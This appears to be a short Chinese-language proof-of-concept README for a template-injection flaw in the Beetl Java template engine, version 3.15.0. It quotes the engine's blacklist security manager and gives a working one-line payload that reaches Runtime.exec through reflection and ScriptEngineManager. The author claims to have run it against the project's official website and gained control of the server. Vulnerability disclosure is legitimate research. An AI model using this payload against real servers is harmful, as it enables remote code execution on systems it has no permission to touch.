# Beetl-3.15.0-vuln-poc
Beetl直到最新版本都存在SSTI(模版注入)漏洞
- 对于安全管理器的策略采用的是黑名单的机制
```java
public class DefaultNativeSecurityManager implements NativeSecurityManager{

        @Override
        public boolean permit(String resourceId, Class c, Object target, String method){
                if (c.isArray()){
                        //允许调用，但实际上会在在其后调用中报错。不归此处管理
                        return true;
                }
                String name = c.getSimpleName();
                String pkg = c.getPackage().getName();
                if (pkg.startsWith("java.lang")){
                        if (name.equals("Runtime") || name.equals("Process") || name.equals("ProcessBuilder")
                                        || name.equals("System")){
                                return false;
                        }
                }
                return true;
        }
}
```
- 如果使用反射(java reflect)即可以绕过黑名单的一切策略
- poc
```java
${@Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("s='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);")}
```
<img src="https://i.328888.xyz/2023/03/31/ilOcbN.png" alt="ilOcbN.png" border="0" />
- 拿官方的网站做例子
- 我输入了以下payload仅用于测试
<a href="https://imgloc.com/i/ilbloa"><img src="https://i.328888.xyz/2023/03/31/ilbloa.png" alt="ilbloa.png" border="0" /></a>
- 并成功
![Uploading image.png…]()拿到
![Uploading image.png…]()服务
![Uploading image.png…]()器
![Uploading image.png…]()的
![Uploading image.png…]()控制权限
